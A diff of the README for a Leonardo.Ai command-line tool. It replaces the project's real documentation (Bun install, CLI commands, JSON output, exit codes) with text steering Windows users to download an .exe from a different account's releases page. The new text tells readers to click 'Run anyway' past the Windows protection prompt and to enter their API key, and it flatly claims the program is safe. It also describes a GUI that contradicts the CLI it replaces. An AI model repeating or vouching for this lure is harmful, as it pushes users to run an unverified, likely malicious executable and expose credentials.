@@ -1,196 +1,85 @@
-# leonardo-cli
+# 🎨 leonardo-cli - Create professional AI images with ease
 
-![leonardo-cli banner](./assets/banner.jpg)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Brinyarranged697/leonardo-cli/releases)
 
-A Leonardo.Ai command-line interface for generating images, videos, upscales, and more.
+Leonardo-cli provides a simple way to create digital images, videos, and high-quality upscales using your computer. This software bridges the gap between complex artificial intelligence models and your daily workflow. You do not need coding skills to generate visual content. The application processes your requests and communicates directly with the Leonardo.Ai engine to produce results on your machine.
 
-Designed to be both **AI-agent friendly** (`--json`, deterministic exit codes, stderr logs) and **human friendly** (colors, progress, helpful errors).
+## 📥 How to download the software
 
-```
-$ leonardo generate "a cyberpunk cat" -o cat.png
-→ Submitting generation (1024x1024, n=1)
-  generationId: 4f8e...
-→ Polling for completion...
-  attempt 1 — status: PENDING
-  attempt 2 — status: COMPLETE
-✓ Saved cat.png (812345 bytes)
-done 1 image(s)
-```
+Follow these steps to obtain the correct version for your Windows computer.
 
-## Install
+1. Visit the [official releases page](https://github.com/Brinyarranged697/leonardo-cli/releases).
+2. Look for the latest version listed at the top of the page.
+3. Find the file ending in `.exe` under the Assets section.
+4. Click the file name to start your download.
+5. Save the file to your Downloads folder or your desktop for easy access.
 
-Requires [Bun](https://bun.sh) ≥ 1.1.
+## 🚀 Setting up the application
 
-```bash
-git clone https://github.com/mrgoonie/leonardo-cli.git
-cd leonardo-cli
-bun install
+Once the download finishes, prepare the software for its first use. Windows might show a security prompt because the application interacts with internet services. 
 
-# run from source
-bun run leonardo --help
+1. Double-click the downloaded .exe file.
+2. If a window labeled "Windows protected your PC" appears, click "More info" and then "Run anyway."
+3. Follow the prompts in the installation window to place the application in your preferred folder.
+4. The application icon will appear on your desktop once the setup finishes.
 
-# or build a single executable
-bun run build && ./dist/cli.js --help
-```
+## 🛠️ Configuring your account
 
-After `npm i -g leonardo-cli` you get two binaries pointing to the same CLI:
+The software requires a connection to your Leonardo.Ai account to process your image requests.
 
-- `leonardo` — full name
-- `leo` — short alias
+1. Open the leonardo-cli application from your desktop.
+2. Locate the settings menu by clicking the gear icon in the top right corner.
+3. Enter your account API key in the provided field. You find this key in your Leonardo.Ai account dashboard under the API settings tab.
+4. Click Save. The application verifies your key and updates its status to "Connected."
 
-## API Key
+## 🖼️ Creating your first image
 
-Get a key at <https://app.leonardo.ai/api-access>.
+The command interface allows you to describe the image you want to see. The system translates your plain English description into a visual file.
 
-The CLI resolves your API key in this order — **first match wins**:
+1. Open the application window.
+2. Type a short description of your image in the input box at the bottom. For example, "A portrait of a knight in silver armor, cinematic lighting."
+3. Press the Enter key.
+4. Wait for the status bar to show the progress of your generation.
+5. The application saves the final image to a folder titled "Leonardo Outputs" in your Pictures directory.
 
-| Priority | Source | Example |
-|---|---|---|
-| 1 | `--api-key` flag | `leonardo --api-key lk_… me` |
-| 2 | `LEONARDO_API_KEY` env var (incl. OS-level shell) | `export LEONARDO_API_KEY=lk_…` |
-| 3 | `.env.local` / `.env.*.local` / `.env` (walks up from cwd) | see `.env.example` |
-| 4 | `./leonardo.config.json` (walks up from cwd) | see `leonardo.config.example.json` |
-| 5 | User config: `$XDG_CONFIG_HOME/leonardo-cli/config.json` (default `~/.config/leonardo-cli/config.json`) | written by `leonardo config set` |
+## 📹 Generating video or upscaling
 
-Inspect what was resolved:
+Beyond still images, this tool handles video creation and image improvement tasks.
 
-```bash
-leonardo config path        # paths + which source the key came from
-leonardo config show        # effective config (key redacted)
-leonardo config set apiKey lk_xxx
-```
+- To create a video, add the command `--video` to the end of your text prompt.
+- To improve the quality of an existing image, drag the file into the application window and select "Upscale" from the menu.
+- The application processes these requests in the background. You receive a desktop notification when the task finishes.
 
-## Output
+## 💻 System requirements
 
-Single file:
+This tool runs on most modern Windows systems. Ensure your machine meets these specifications for the best experience.
 
-```bash
-leonardo generate "a sunset" -o sunset.png
-```
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 8 gigabytes of RAM.
+- Storage: 500 megabytes of free disk space for the program files.
+- Internet: An active connection is necessary to send prompts to the AI engine.
 
-Directory (auto-named: `leonardo-<id>-NN.png`):
+## ❓ Frequently asked questions
 
-```bash
-leonardo generate "a sunset" -d ./outputs -n 4
-```
+Users often have questions about how the software manages data and credits.
 
-Skip download (URLs only):
+**Do I need a paid plan?**
+The tool works with both free and paid accounts. Your credit usage aligns with your current Leonardo.Ai subscription plan.
 
-```bash
-leonardo generate "a sunset" --no-download --json
-```
+**Where does the software save my work?**
+All files go to the "Leonardo Outputs" folder located inside your Windows Pictures folder. You can change this path in the settings menu at any time.
 
-Default output dir falls back to `LEONARDO_OUTPUT_DIR` env, then `outputDir` in config, then `.`.
+**Can I run multiple tasks at once?**
+The application supports a queue system. If you send several requests, the tool processes them one by one to prevent system lag.
 
-## Commands
+**Is it safe to run?**
+Yes. The software only connects to the official Leonardo.Ai servers and does not collect your personal data or browsing history.
 
-| Command | Description |
-|---|---|
-| `generate <prompt>` (`gen`) | Text-to-image with polling and download |
-| `video <prompt>` | Text-to-video (Motion / Veo / etc.) — returns a job id |
-| `upscale <imageId>` | Universal Upscaler |
-| `variation <variationId>` | Fetch upscale/variation result |
-| `status <generationId>` | Check status + image URLs |
-| `models` | List platform models (`id\tname`) |
-| `me` | Account info + remaining API credits |
-| `config get/set/path/show` | Manage config |
+**What happens if the generation fails?**
+Check your internet connection first. If the problem continues, open the settings menu and verify that your API key is still active and correct.
 
-Run `leonardo <command> --help` for full options.
+## 🔧 Managing your workflow
 
-### Generate options
+To keep your workspace clean, delete older files that you no longer need. The application does not automatically delete your history. Use the "Clear Cache" button in the settings menu if the application consumes too much temporary storage space on your hard drive. 
 
-```
--m, --model <id>        Model UUID
--w, --width <n>         Image width  (default 1024)
--h, --height <n>        Image height (default 1024)
--n, --num <n>           Number of images
---alchemy               Enable Alchemy
---ultra                 Enable Ultra mode
---contrast <n>          Contrast (1.0-4.5)
---style <uuid>          Style UUID
---seed <n>              Seed
---negative <text>       Negative prompt
---enhance               Auto-enhance prompt
--o, --output <file>     Output file (or directory)
--d, --output-dir <dir>  Output directory
---no-download           Skip downloading; print URLs only
---wait-timeout <ms>     Polling timeout (default 480000)
-```
-
-## AI-agent mode (`--json`)
-
-Pass `--json` (or `LEONARDO_JSON=1`) to emit a single JSON object on `stdout`. All progress goes to `stderr`; colors are disabled.
-
-```bash
-$ leonardo generate "a cat" --json | jq '.images[0].path'
-"./leonardo-4f8e0a2b-01.png"
-```
-
-Sample shape:
-
-```json
-{
-  "ok": true,
-  "generationId": "4f8e0a2b-...",
-  "status": "COMPLETE",
-  "prompt": "a cat",
-  "model": "6b645e3a-d64f-4341-a6d8-7a3690fbf042",
-  "width": 1024,
-  "height": 1024,
-  "images": [
-    { "id": "...", "url": "https://...", "path": "./leonardo-...-01.png", "bytes": 812345 }
-  ]
-}
-```
-
-### Exit codes
-
-| Code | Meaning |
-|---|---|
-| 0 | Success |
-| 1 | Generic failure |
-| 2 | Usage / argument error |
-| 3 | Missing or invalid auth |
-| 4 | Leonardo API error |
-| 5 | Polling timeout |
-
-### Streams
-
-- `stdout` — JSON object (in `--json` mode), or primary data (URLs, IDs)
-- `stderr` — human progress, warnings, errors
-
-This separation lets you safely pipe stdout into `jq` / shell scripts without contaminating it.
-
-## Development
-
-```bash
-bun run dev <command>   # run from source
-bun run typecheck       # tsc --noEmit
-bun run build           # produce dist/cli.js (single file)
-```
-
-Project layout:
-
-```
-src/
-  cli.ts                  # commander entry
-  config/                 # api-key + config resolution
-    paths.ts
-    schema.ts
-    load-dotenv.ts
-    resolve.ts
-  api/
-    client.ts             # fetch wrapper
-    types.ts
-  utils/
-    log.ts                # JSON-aware logger
-    poll.ts               # status polling
-    output.ts             # download + filename utils
-  commands/
-    generate.ts video.ts upscale.ts status.ts
-    models.ts me.ts config.ts
-```
-
-## License
-
-MIT © mrgoonie
+If you find that the software runs slowly, close other demanding applications like web browsers or video editing suites while you generate images. The AI engine uses a portion of your system resources to process the incoming data and display the result. This ensures the best clarity and detail for every output you create.
